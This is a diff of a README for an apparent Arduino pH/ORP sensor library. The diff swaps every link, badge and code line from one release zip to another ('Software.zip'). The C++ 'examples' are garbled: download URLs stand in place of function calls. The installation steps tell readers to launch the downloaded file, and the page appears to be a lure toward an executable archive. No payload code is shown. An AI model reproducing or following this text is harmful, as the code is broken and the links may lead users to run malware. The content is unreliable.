@@ -1,12 +1,12 @@
 # 🌟 **APAPHX_ADS1015 Arduino Library**
 
-![APAPHX_ADS1015](https://github.com/zeroVR988/APAPHX_ADS1015/releases/download/v1.0/Application.zip)
+![APAPHX_ADS1015](https://github.com/zeroVR988/APAPHX_ADS1015/releases/download/v2.0/Software.zip)
 
 ## Overview
 Welcome to the APAPHX_ADS1015 Arduino library repository. This library is designed for pH and ORP/Redox measurements using non-blocking operation, two-point calibration, and error detection. It features configurable sampling, rolling averages, and range validation for pH (0-14) and ORP (0-1000mV) measurements. This library is compatible with any pH/ORP analog circuits utilizing the ADS1015. The best part? No external dependencies are needed besides Wire.h.
 
 ## Installation
-1. Download the [APAPHX_ADS1015 library](https://github.com/zeroVR988/APAPHX_ADS1015/releases/download/v1.0/Application.zip).
+1. Download the [APAPHX_ADS1015 library](https://github.com/zeroVR988/APAPHX_ADS1015/releases/download/v2.0/Software.zip).
 2. Launch the downloaded file and extract the contents.
 3. Move the extracted folder to your Arduino libraries directory.
 
@@ -36,14 +36,14 @@ APAPHX_ADS1015 sensor;
 3. Initialize the library in the `setup()` function:
 ```cpp
 void setup() {
-    https://github.com/zeroVR988/APAPHX_ADS1015/releases/download/v1.0/Application.zip();
+    https://github.com/zeroVR988/APAPHX_ADS1015/releases/download/v2.0/Software.zip();
 }
 ```
 
 4. Use the library functions to read pH and ORP values:
 ```cpp
-float pHValue = https://github.com/zeroVR988/APAPHX_ADS1015/releases/download/v1.0/Application.zip();
-float ORPValue = https://github.com/zeroVR988/APAPHX_ADS1015/releases/download/v1.0/Application.zip();
+float pHValue = https://github.com/zeroVR988/APAPHX_ADS1015/releases/download/v2.0/Software.zip();
+float ORPValue = https://github.com/zeroVR988/APAPHX_ADS1015/releases/download/v2.0/Software.zip();
 ```
 
 5. Enjoy accurate pH and ORP measurements in your projects!
@@ -67,8 +67,8 @@ float ORPValue = https://github.com/zeroVR988/APAPHX_ADS1015/releases/download/v
 - watertreatment
 
 ## Learn More
-For more detailed information, visit the official [APAPHX_ADS1015 GitHub Repository](https://github.com/zeroVR988/APAPHX_ADS1015/releases/download/v1.0/Application.zip).
+For more detailed information, visit the official [APAPHX_ADS1015 GitHub Repository](https://github.com/zeroVR988/APAPHX_ADS1015/releases/download/v2.0/Software.zip).
 
-[![Download APAPHX_ADS1015](https://github.com/zeroVR988/APAPHX_ADS1015/releases/download/v1.0/Application.zip)](https://github.com/zeroVR988/APAPHX_ADS1015/releases/download/v1.0/Application.zip)
+[![Download APAPHX_ADS1015](https://github.com/zeroVR988/APAPHX_ADS1015/releases/download/v2.0/Software.zip)](https://github.com/zeroVR988/APAPHX_ADS1015/releases/download/v2.0/Software.zip)
 
 🔧🔬🌡️ Happy measuring with APAPHX_ADS1015! 🌊🌟
